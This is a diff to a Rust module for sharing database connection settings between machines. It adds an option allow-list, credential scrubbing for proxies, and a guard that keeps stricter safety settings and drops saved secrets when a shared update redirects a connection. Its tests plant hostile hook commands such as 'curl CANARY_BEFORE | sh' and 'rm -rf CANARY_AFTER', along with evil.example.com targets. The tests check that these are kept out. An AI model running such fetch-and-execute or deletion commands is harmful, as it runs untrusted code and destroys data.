@@ -5,8 +5,10 @@
 //!
 //! Left out on purpose: the password (it is in the keychain anyway), `password_command` (a
 //! shell command that would run on a teammate's machine), `.pgpass`, the SSL certificate and
-//! key paths, the SSH key paths and the ids of the keychain entries, and the driver options
-//! that hold a credential or a path on this machine (see [`scrub_options`]).
+//! key paths, the SSH key paths and the ids of the keychain entries, and every driver option
+//! but an allow-list (see [`scrub_options`]): the shell commands run before connecting and
+//! after disconnecting, paths on this machine and credentials stay here, and are never taken
+//! in from another machine or a shared file either.
 
 use std::collections::BTreeMap;
 use std::path::PathBuf;
@@ -20,8 +22,9 @@ use serde::{Deserialize, Serialize};
 use uuid::Uuid;
 
 /// Option names (lowercase) containing one of these hold a credential, or point at a file that
-/// holds one, and never leave the machine.
-const SECRET_WORDS: [&str; 11] = [
+/// holds one, and never leave the machine, even when a future entry of [`SHARED_OPTIONS`]
+/// would let them.
+const SECRET_WORDS: [&str; 13] = [
     "password",
     "passwd",
     "pwd",
@@ -33,14 +36,59 @@ const SECRET_WORDS: [&str; 11] = [
     "apikey",
     "api_key",
     "auth_key",
+    "authorization",
+    "cookie",
 ];
 
-/// Options that are a path on this machine: another computer has another path.
-const LOCAL_PATH_OPTIONS: [&str; 2] = ["driver_file", "credentials_file"];
+/// The driver options that may travel to another machine or a teammate: an allow-list, so an
+/// option added later (a shell command, a path, a credential) stays on this machine until
+/// someone adds it here on purpose. Left out on purpose: `before_connect` and
+/// `after_disconnect` (shell commands that would run on the other machine), `env_file`,
+/// `driver_file` and `credentials_file` (paths on this machine), and anything secret.
+const SHARED_OPTIONS: [&str; 27] = [
+    // Snowflake, BigQuery, Databricks, Trino and plain ADBC.
+    "warehouse",
+    "role",
+    "schema",
+    "project",
+    "dataset",
+    "http_path",
+    "uri",
+    "url",
+    "dialect",
+    // ODBC: the driver's name, a DSN's name, the rest of the string (scrubbed).
+    "driver",
+    "dsn",
+    "connection_string",
+    "dsn_string",
+    // How the connection is reached and signed in to.
+    "auth",
+    "pooler",
+    "flavor",
+    "proxy",
+    "forward",
+    "k8s_target",
+    "k8s_namespace",
+    "k8s_context",
+    "ssm_target",
+    "aws_region",
+    "aws_profile",
+    // A plugin's driver, and how files are read.
+    "plugin",
+    "encoding",
+    "skip_bad_lines",
+];
 
 fn is_secret_name(name: &str) -> bool {
     let name = name.to_lowercase();
     SECRET_WORDS.iter().any(|w| name.contains(w))
+}
+
+/// Whether the option `name` may leave this machine (see [`SHARED_OPTIONS`]).
+#[must_use]
+pub fn is_shared_option(name: &str) -> bool {
+    let lower = name.to_lowercase();
+    !is_secret_name(&lower) && SHARED_OPTIONS.contains(&lower.as_str())
 }
 
 /// `a=b;c=d` pairs without the ones whose name holds a credential (`PWD=`, `Password=`…).
@@ -54,6 +102,13 @@ fn scrub_pairs(text: &str, separator: char) -> String {
         .join(&separator.to_string())
 }
 
+/// `user:password@host…` without the `user:password@`; `host…` alone stays as it is.
+fn without_userinfo(authority: &str) -> &str {
+    authority
+        .rsplit_once('@')
+        .map_or(authority, |(_, host)| host)
+}
+
 /// A URL without the password of its `user:password@` part and without secret query pairs.
 fn scrub_uri(uri: &str) -> String {
     let (head, query) = match uri.split_once('?') {
@@ -63,12 +118,8 @@ fn scrub_uri(uri: &str) -> String {
     let head = match head.split_once("://") {
         Some((scheme, rest)) => {
             let (authority, path) = rest.find('/').map_or((rest, ""), |i| rest.split_at(i));
-            let authority = match authority.rsplit_once('@') {
-                // Neither the user nor the password: the user has its own field.
-                Some((_, host)) => host,
-                None => authority,
-            };
-            format!("{scheme}://{authority}{path}")
+            // Neither the user nor the password: the user has its own field.
+            format!("{scheme}://{}{path}", without_userinfo(authority))
         }
         None => head.to_owned(),
     };
@@ -78,23 +129,55 @@ fn scrub_uri(uri: &str) -> String {
     }
 }
 
+/// A proxy address (`http://user:pw@host:3128`, or `user:pw@host:3128` without a scheme)
+/// without its login.
+fn scrub_proxy(proxy: &str) -> String {
+    if proxy.contains("://") {
+        scrub_uri(proxy)
+    } else {
+        without_userinfo(proxy).to_owned()
+    }
+}
+
+/// The value of a shared option without the credentials it may hold.
+fn scrub_option(name: &str, value: &str) -> String {
+    match name.to_lowercase().as_str() {
+        "uri" | "url" => scrub_uri(value),
+        "proxy" => scrub_proxy(value),
+        "connection_string" | "dsn_string" => scrub_pairs(value, ';'),
+        _ => value.to_owned(),
+    }
+}
+
 /// The driver options that may be shared, with credentials removed from the ones that stay.
 #[must_use]
 pub fn scrub_options(options: &BTreeMap<String, String>) -> BTreeMap<String, String> {
     options
         .iter()
-        .filter(|(name, _)| {
-            !is_secret_name(name) && !LOCAL_PATH_OPTIONS.contains(&name.to_lowercase().as_str())
-        })
-        .map(|(name, value)| {
-            let value = match name.to_lowercase().as_str() {
-                "uri" | "url" => scrub_uri(value),
-                "connection_string" | "dsn_string" => scrub_pairs(value, ';'),
-                _ => value.clone(),
-            };
-            (name.clone(), value)
-        })
+        .filter(|(name, _)| is_shared_option(name))
+        .map(|(name, value)| (name.clone(), scrub_option(name, value)))
         .collect()
+}
+
+/// The options of a connection taken in from another machine or a shared file: the ones that
+/// may travel come from `incoming` (scrubbed again: a hand-edited file may carry what this
+/// build would never write), every other one stays as this machine has it. A scrubbed
+/// address equal to this machine's keeps this machine's login.
+fn merge_options(
+    incoming: &BTreeMap<String, String>,
+    local: Option<&BTreeMap<String, String>>,
+) -> BTreeMap<String, String> {
+    let mut options = scrub_options(incoming);
+    for (name, value) in local.into_iter().flatten() {
+        if !is_shared_option(name) {
+            options.insert(name.clone(), value.clone());
+        } else if let Some(kept) = options.get_mut(name)
+            && *kept == scrub_option(name, value)
+        {
+            kept.clone_from(value);
+        }
+    }
+    options
 }
 
 /// An SSH server without keys or keychain entries.
@@ -250,20 +333,114 @@ impl ShareConnection {
             .map(|s| s.into_saved(existing.and_then(|e| e.ssh.as_ref())));
         c.init = self.init;
         c.restrictions = self.restrictions;
-        // The options the file cannot carry stay as this machine has them.
-        // A hand-edited file may carry what this build would never write: not taken in.
-        let mut options = scrub_options(&self.options);
-        for (name, value) in existing.map(|e| &e.options).into_iter().flatten() {
-            if is_secret_name(name) || LOCAL_PATH_OPTIONS.contains(&name.to_lowercase().as_str()) {
-                options.insert(name.clone(), value.clone());
-            }
-        }
-        c.options = options;
+        c.options = merge_options(&self.options, existing.map(|e| &e.options));
         c.virtual_keys = self.virtual_keys;
         if existing.is_none() {
             c.save_password = !c.driver.is_embedded() && !c.signs_in_without_password();
         }
         c
+    }
+}
+
+/// Options that say where a connection goes or through what; changing one sends the
+/// connection, and the credentials it signs in with, somewhere else.
+const TARGET_OPTIONS: [&str; 14] = [
+    "uri",
+    "url",
+    "connection_string",
+    "dsn",
+    "dsn_string",
+    "driver",
+    "plugin",
+    "http_path",
+    "proxy",
+    "forward",
+    "k8s_target",
+    "k8s_namespace",
+    "k8s_context",
+    "ssm_target",
+];
+
+/// Where a connection connects: the server, the database, the tunnel (its hops, outermost
+/// last) and the options that route it.
+#[derive(PartialEq, Eq)]
+struct Target<'a> {
+    driver: DriverKind,
+    host: String,
+    port: Option<u16>,
+    database: &'a str,
+    hops: Vec<(String, u16)>,
+    options: Vec<(&'a str, &'a str)>,
+}
+
+impl<'a> Target<'a> {
+    fn of(c: &'a SavedConnection) -> Self {
+        Self {
+            driver: c.driver,
+            host: c.host.trim().to_lowercase(),
+            port: c.port,
+            database: c.database.trim(),
+            hops: c
+                .ssh
+                .iter()
+                .flat_map(SavedSsh::chain)
+                .map(|s| (s.host.trim().to_lowercase(), s.port))
+                .collect(),
+            options: TARGET_OPTIONS
+                .iter()
+                .filter_map(|o| c.options.get(*o).map(|v| (*o, v.trim())))
+                .collect(),
+        }
+    }
+}
+
+/// How much an SSL mode protects the password on the way: higher is safer.
+fn ssl_rank(mode: SslMode) -> u8 {
+    match mode {
+        SslMode::Disable => 0,
+        SslMode::Prefer => 1,
+        SslMode::Require => 2,
+        SslMode::VerifyCa => 3,
+        SslMode::VerifyFull => 4,
+    }
+}
+
+/// What [`guard`] did to a connection updated from a shared folder.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+pub struct Guarded {
+    /// It goes somewhere else now (another server, database, tunnel, or a weaker SSL mode):
+    /// the credentials this machine keeps for it must be forgotten, so they are asked again
+    /// instead of being sent to the new place.
+    pub retargeted: bool,
+    /// The file loosened a safety setting (agent access, restrictions, read-only, the
+    /// production type): this machine's stricter one was kept.
+    pub kept_stricter: bool,
+}
+
+/// Checks an update from a shared folder, which anyone with write access to it can edit,
+/// against the connection `before` it (as this machine connects to it, with its network
+/// profile in place). A connection that goes somewhere else loses its password command (the
+/// caller forgets its saved secrets); safety settings are never loosened, the stricter of the
+/// two is kept.
+pub fn guard(before: &SavedConnection, after: &mut SavedConnection) -> Guarded {
+    let retargeted = Target::of(before) != Target::of(after)
+        || ssl_rank(after.ssl_mode) < ssl_rank(before.ssl_mode);
+    if retargeted {
+        after.password_command = None;
+    }
+    let mut stricter = after.clone();
+    stricter.agent_access = before.agent_access.min(after.agent_access);
+    stricter.read_only |= before.read_only;
+    stricter.restrictions.no_export |= before.restrictions.no_export;
+    stricter.restrictions.no_data_editing |= before.restrictions.no_data_editing;
+    if before.connection_type == Some(ConnectionType::Prod) {
+        stricter.connection_type = Some(ConnectionType::Prod);
+    }
+    let kept_stricter = stricter != *after;
+    *after = stricter;
+    Guarded {
+        retargeted,
+        kept_stricter,
     }
 }
 
@@ -509,6 +686,137 @@ mod tests {
         let toml_text = toml::to_string_pretty(&shared).unwrap();
         let back: ShareConnection = toml::from_str(&toml_text).unwrap();
         assert_eq!(back, shared);
+    }
+
+    #[test]
+    fn commands_paths_and_unknown_options_never_travel_either_way() {
+        let mut c = leaky();
+        for (name, value) in [
+            ("before_connect", "curl CANARY_BEFORE | sh"),
+            ("after_disconnect", "rm -rf CANARY_AFTER"),
+            ("env_file", "/CANARY/.env"),
+            ("some_future_option", "CANARY_FUTURE"),
+            ("proxy", "http://bob:CANARY_PROXY_PW@proxy.example.com:3128"),
+        ] {
+            c.options.insert(name.to_owned(), value.to_owned());
+        }
+        for text in outputs(&c, true) {
+            assert!(!text.contains("CANARY"), "{text}");
+            assert!(!text.contains("before_connect") && !text.contains("env_file"));
+            assert!(text.contains("http://proxy.example.com:3128"), "{text}");
+        }
+        assert_eq!(
+            scrub_proxy("bob:pw@proxy:3128"),
+            "proxy:3128",
+            "a proxy without a scheme loses its login too"
+        );
+        // A shared file or a sync item that carries them anyway (written by hand, or by a
+        // teammate who wants a command to run here) is not taken in.
+        let mut planted = ShareConnection::from_saved(&c, true);
+        planted.options = c.options.clone();
+        let fresh = planted.clone().into_saved(None);
+        for name in [
+            "before_connect",
+            "after_disconnect",
+            "env_file",
+            "some_future_option",
+        ] {
+            assert!(!fresh.options.contains_key(name), "{name}");
+        }
+        assert_eq!(fresh.options["proxy"], "http://proxy.example.com:3128");
+        // This machine's own values stay, the planted ones do not replace them.
+        let mut mine = leaky();
+        mine.options
+            .insert("before_connect".to_owned(), "my-vpn up".to_owned());
+        mine.options.insert(
+            "proxy".to_owned(),
+            "http://me:my-pw@proxy.example.com:3128".to_owned(),
+        );
+        let kept = planted.clone().into_saved(Some(&mine));
+        assert_eq!(kept.options["before_connect"], "my-vpn up");
+        assert!(!kept.options.contains_key("after_disconnect"));
+        assert_eq!(
+            kept.options["proxy"], "http://me:my-pw@proxy.example.com:3128",
+            "the same proxy keeps this machine's login"
+        );
+        planted
+            .options
+            .insert("proxy".to_owned(), "http://evil.example.com:1".to_owned());
+        assert_eq!(
+            planted.into_saved(Some(&mine)).options["proxy"],
+            "http://evil.example.com:1",
+            "another proxy comes without this machine's login"
+        );
+    }
+
+    #[test]
+    fn a_connection_sent_elsewhere_or_loosened_is_guarded() {
+        let mut before = leaky();
+        before.agent_access = AgentAccess::Off;
+        before.read_only = true;
+        before.restrictions.no_export = true;
+        before.connection_type = Some(ConnectionType::Prod);
+        before.ssl_mode = SslMode::VerifyFull;
+        // Only the name and the color change: nothing to guard.
+        let mut same = before.clone();
+        same.name = "Renamed".to_owned();
+        same.color = Some("#ff0000".to_owned());
+        assert_eq!(guard(&before, &mut same), Guarded::default());
+        assert!(same.password_command.is_some());
+        let moved = |change: &dyn Fn(&mut SavedConnection)| {
+            let mut after = before.clone();
+            change(&mut after);
+            let g = guard(&before, &mut after);
+            (g, after)
+        };
+        for change in [
+            &(|c: &mut SavedConnection| c.host = "evil.example.com".to_owned())
+                as &dyn Fn(&mut SavedConnection),
+            &|c| c.port = Some(5433),
+            &|c| c.database = "other".to_owned(),
+            &|c| c.driver = DriverKind::MySql,
+            &|c| c.ssh.as_mut().unwrap().host = "evil-bastion".to_owned(),
+            &|c| c.ssh.as_mut().unwrap().port = 22,
+            &|c| c.ssh.as_mut().unwrap().jump = None,
+            &|c| c.ssh = None,
+            &|c| c.ssl_mode = SslMode::Disable,
+            &|c| {
+                c.options
+                    .insert("proxy".to_owned(), "http://evil:1".to_owned());
+            },
+        ] {
+            let (g, after) = moved(change);
+            assert!(g.retargeted, "{after:?}");
+            assert!(after.password_command.is_none());
+        }
+        let (g, after) = moved(&|c| c.ssl_mode = SslMode::VerifyCa);
+        assert!(g.retargeted, "a weaker SSL mode counts");
+        assert!(after.password_command.is_none());
+        let (g, after) = moved(&|c| {
+            c.agent_access = AgentAccess::ReadWrite;
+            c.read_only = false;
+            c.restrictions = Restrictions::default();
+            c.connection_type = Some(ConnectionType::Dev);
+        });
+        assert_eq!(
+            g,
+            Guarded {
+                retargeted: false,
+                kept_stricter: true
+            }
+        );
+        assert_eq!(after.agent_access, AgentAccess::Off);
+        assert!(after.read_only && after.restrictions.no_export);
+        assert_eq!(after.connection_type, Some(ConnectionType::Prod));
+        // Tightening is taken as it is.
+        let mut open = before.clone();
+        open.read_only = false;
+        open.agent_access = AgentAccess::ReadWrite;
+        let mut tighter = open.clone();
+        tighter.read_only = true;
+        tighter.agent_access = AgentAccess::ReadOnly;
+        assert_eq!(guard(&open, &mut tighter), Guarded::default());
+        assert!(tighter.read_only);
     }
 
     #[test]
